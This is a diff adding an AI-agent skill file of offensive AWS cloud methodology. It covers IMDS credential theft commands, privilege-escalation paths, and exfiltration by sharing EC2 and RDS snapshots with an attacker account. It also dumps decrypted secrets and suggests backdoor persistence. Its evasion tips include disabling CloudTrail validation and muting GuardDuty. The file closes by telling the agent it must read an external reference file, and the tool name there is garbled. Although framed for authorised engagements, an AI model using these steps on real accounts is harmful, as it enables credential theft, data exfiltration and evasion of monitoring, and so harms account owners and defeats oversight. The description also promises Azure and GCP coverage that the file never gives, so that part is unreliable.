@@ -1,0 +1,130 @@
+---
+name: offensive-cloud
+description: "Cloud security attack methodology covering AWS, Azure, and GCP. Includes credential harvesting (IMDS, ~/.aws, env vars, leaked CI secrets, instance roles), enumeration with cloud-specific tools (pacu, ScoutSuite, Prowler, ROADtools, gcp_enum), privilege escalation paths (IAM PassRole, AssumeRole chains, Lambda/Functions privilege flips, Azure Owner-on-self, GCP serviceAccountTokenCreator), persistence techniques (IAM user/key creation, AAD app registration, GCP svc account key creation, EventBridge/Logic Apps backdoors), data exfiltration (S3/Blob/GCS, snapshot share, RDS/CosmosDB/Cloud SQL exfil), cloud-native lateral movement (cross-account assume, Azure AD multi-tenant, GCP project hierarchy), serverless attacks (Lambda env vars, layer hijack, Step Functions), Kubernetes-on-cloud (EKS/AKS/GKE-specific paths to node and AWS metadata), and CSPM evasion (CloudTrail blind spots, GuardDuty mute, Sentinel rule shaping). Use when the engagement scope is cloud accounts, when you've stolen cloud credentials, or when assessing cloud posture."
+---
+
+# Cloud (AWS / Azure / GCP) — Offensive Testing Methodology
+
+## Quick Workflow
+
+1. Identify the cloud and the identity context you have (user, role, service account, instance role)
+2. Enumerate without writes — `aws sts get-caller-identity`, `az account show`, `gcloud auth list`
+3. Map permissions to known privilege-escalation primitives (PassRole, Owner, etc.)
+4. Find the data and the persistence anchors before alarms fire
+5. Document the kill chain with timestamps, identities, and resources for the report
+
+---
+
+## AWS
+
+### Identity Discovery
+
+```bash
+aws sts get-caller-identity
+aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | awk -F/ '{print $NF}')
+aws iam list-attached-role-policies --role-name <role>
+aws iam simulate-principal-policy --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
+  --action-names "*"
+```
+
+### IMDS Credential Theft
+
+```bash
+# IMDSv1 (legacy)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+
+# IMDSv2 (modern, requires token)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+From SSRF, IMDSv2 was historically reachable when the SSRF allowed setting custom headers. Modern AWS denies SSRF without `Host: 169.254.169.254` and proper `PUT`-then-`GET` flow — SSRF in 2024+ rarely yields IMDSv2 unless the proxy reflects custom headers.
+
+### Privilege Escalation Paths
+
+| Path | Required Permission | Outcome |
+|------|---------------------|---------|
+| `iam:PassRole` + `lambda:CreateFunction` | Pass any role to Lambda you create | Run code as that role |
+| `iam:PassRole` + `ec2:RunInstances` | Pass any role to EC2 instance | IMDS → role creds |
+| `iam:CreatePolicyVersion` + `iam:SetDefaultPolicyVersion` | Edit your own policy | Self-elevate |
+| `iam:UpdateAssumeRolePolicy` | On a privileged role | Add yourself as principal |
+| `iam:CreateLoginProfile` (on user without one) | Set console password | Console access |
+| `iam:CreateAccessKey` (on another user) | Mint keys for someone else | Persistent access |
+| `sts:AssumeRole` with `sts:TagSession` to ABAC role | If role trusts session tags | Tag-based escalation |
+| `cloudformation:CreateStack` + permissive role | Run any service action | Indirect arbitrary perms |
+| `glue:UpdateDevEndpoint` | Inject SSH key into Glue endpoint | Code exec as Glue role |
+| `ssm:SendCommand` to any instance | RCE on instances + their roles | Lateral + escalation |
+
+```bash
+# Pacu — the tooling for AWS escalation
+pacu
+> import_keys default
+> run iam__enum_permissions
+> run iam__privesc_scan
+```
+
+### Cross-Account / Organization
+
+```bash
+# Find roles trusting the current account
+aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument!=null]'
+# Then grep AssumeRolePolicyDocument.Statement for trusts to your account
+
+# Org-wide (if Organizations access)
+aws organizations list-accounts
+aws organizations list-roots
+```
+
+### Data Targets
+
+```bash
+# S3
+aws s3api list-buckets
+aws s3 ls s3://<bucket> --recursive | head
+aws s3api get-bucket-policy --bucket <bucket>
+
+# Cross-region snapshot share (data exfil without S3)
+aws ec2 modify-snapshot-attribute --snapshot-id snap-... \
+  --attribute createVolumePermission \
+  --create-volume-permission "Add=[{UserId=ATTACKER_ACCT}]"
+
+# RDS snapshot share
+aws rds modify-db-snapshot-attribute --db-snapshot-identifier mysnap \
+  --attribute-name restore --values-to-add ATTACKER_ACCT
+
+# Secrets Manager / Parameter Store
+aws secretsmanager list-secrets
+aws ssm get-parameters-by-path --path / --recursive --with-decryption
+```
+
+### Persistence
+
+```bash
+# Cross-account SCP exemption via service-linked role
+# AWS Config snapshot delivery channel rerouted to attacker bucket
+aws configservice put-delivery-channel ...  # Rare but devastating
+
+# EventBridge rule firing Lambda you control on every IAM change
+# Backdoor: Lambda creates an access key for any new admin user
+```
+
+### Detection Evasion
+
+- CloudTrail to multi-region with log file validation — disable validation if you have perms
+- GuardDuty findings can be muted via `update-findings-feedback` if you have the permission (rare in prod)
+- VPC Flow Logs only catch IP traffic; control-plane API calls are CloudTrail-only
+
+---
+
+
+---
+
+## 📚 Deep Reference (Progressive Disclosure)
+
+> ⚠️ **CONTEXT OPTIMIZATION:** The detailed methodology, edge cases, attack vectors, and advanced configurations for this skill are stored externally to save tokens.
+
+To access the full technical reference, you MUST use your iew_file tool to read:
+
+d:\xampp\htdocs\0-fonte\.agent\skills\claude-red-offensive-cloud\references\reference.md
